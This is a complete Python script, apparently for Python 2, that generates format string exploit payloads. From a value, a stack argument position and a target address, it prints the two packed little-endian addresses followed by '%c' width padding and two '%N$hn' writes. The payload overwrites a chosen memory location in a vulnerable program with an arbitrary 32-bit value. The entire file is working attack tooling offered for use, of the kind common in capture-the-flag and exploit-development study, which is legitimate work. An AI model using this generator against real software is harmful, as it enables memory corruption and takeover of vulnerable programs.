import sys

if len(sys.argv) < 4:
    print("0x<value to write> <pos> 0x<target address>")
    sys.exit(1)

#From a string of type 0x12341234 to the byte value
def hex_to_bytes(s):
    s = s[2:]
    b =  chr(int(s[0:2], 16))
    b += chr(int(s[2:4], 16))
    b += chr(int(s[4:6], 16))
    b += chr(int(s[6:8], 16))
    return b

#From the byte to the hex string
def bytes_to_hex_string(s):
    return ''.join('\\x%02x' % ord(z) for z in s)

def main():
    pos_1 = int(sys.argv[2])
    pos_2 = pos_1 + 1

    #What to write, 32 bit
    val = hex_to_bytes(sys.argv[1])

    #What to write, 16 bit each
    val_1 = (ord(val[0]) * 256 + ord(val[1]))
    val_2 = (ord(val[2]) * 256 + ord(val[3]))

    #Where to write 32 bit each + little endian
    addr_1 = (hex_to_bytes(sys.argv[3]))
    addr_2 = (addr_1[0:3] + chr(ord(addr_1[3]) + 2))[::-1]
    addr_1 = addr_1[::-1]

    #Choose the right order
    if val_1 > val_2:
        addrs = addr_1 + addr_2
        vals = (val_2, val_1)
    else:
        addrs = addr_2 + addr_1
        vals = (val_1, val_2)

    second = '%%%05dx' % (vals[1] - vals[0])

    r = bytes_to_hex_string(addr_1) + bytes_to_hex_string(addr_2)
    print("Real target address: ",r)
    print()
    sys.stdout.write(addrs + "%%%05dc%%%05d$hn%s%%%05d$hn\n" % (vals[0]-8, pos_1, second, pos_2))

    return 0

if __name__ == '__main__':
    sys.exit(main())
